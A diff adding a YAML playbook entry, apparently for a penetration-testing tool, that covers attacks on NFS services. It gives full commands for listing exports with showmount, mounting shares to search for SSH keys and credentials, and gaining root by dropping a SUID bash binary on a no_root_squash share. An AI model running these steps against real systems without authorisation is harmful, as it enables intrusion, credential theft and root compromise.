@@ -1,0 +1,57 @@
+id: nfs
+name: NFS Network File System (Ports 111 / 2049)
+category: network
+description: Methodology for Network File System (NFS) on ports 111 and 2049. Covers showmount share discovery, mounting exports, no_root_squash privilege escalation, and SUID file drops.
+port_triggers:
+  - 111
+  - 2049
+service_triggers:
+  - nfs
+  - rpcbind
+tags:
+  - nfs
+  - rpcbind
+  - shares
+  - privesc
+steps:
+  - id: nfs-showmount
+    title: Discover Available NFS Exports (showmount)
+    phase: reconnaissance
+    purpose: Query the NFS rpcbind daemon to discover all exported directory paths and client access permissions.
+    command: showmount -e {{TARGET}}
+    expected_output:
+      - 'Export list for {{TARGET}}:'
+      - /var/backups (everyone)
+      - /home/developer *
+    common_mistakes:
+      - If `showmount` fails, scan with `nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls {{TARGET}}`.
+    if_success: NFS shares identified! Proceed to mount the exported directory locally.
+    if_failure: No exports shared or filtered. Check firewall rules.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
+  - id: nfs-mount-share
+    title: Mount Remote NFS Share Locally
+    phase: enumeration
+    purpose: Mount the target NFS export to a local directory to read source code, configuration files, and private SSH keys.
+    command: sudo mkdir -p /mnt/target_nfs && sudo mount -t nfs {{TARGET}}:/{{SHARE_NAME|var/backups}} /mnt/target_nfs -o nolock
+    expected_output:
+      - '[NFS share mounted to /mnt/target_nfs]'
+    common_mistakes:
+      - Forgetting `-o nolock`; older NFS servers hang without nolock option over VPN.
+    if_success: NFS mounted! Browse `/mnt/target_nfs` and search for id_rsa, database dumps, and credentials.
+    if_failure: Permission denied (access restricted by IP). Check other interfaces or subnet IPs.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
+  - id: nfs-root-squash-privesc
+    title: Privilege Escalation via no_root_squash SUID Drop
+    phase: privesc
+    purpose: If the share has `no_root_squash` enabled in `/etc/exports`, copy a bash binary from your local root account with SUID permissions to execute as root on the target.
+    command: sudo cp /bin/bash /mnt/target_nfs/rootbash && sudo chmod +s /mnt/target_nfs/rootbash
+    expected_output:
+      - '-rwsr-sr-x 1 root root /mnt/target_nfs/rootbash'
+    common_mistakes:
+      - On the target machine, execute with `./rootbash -p` to preserve root SUID privileges.
+    if_success: SUID binary written! On target run `/path/to/share/rootbash -p` for instant root shell.
+    if_failure: Root squashed (nobody:nogroup). Check for user UID spoofing (`useradd -u <target_uid>`).
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
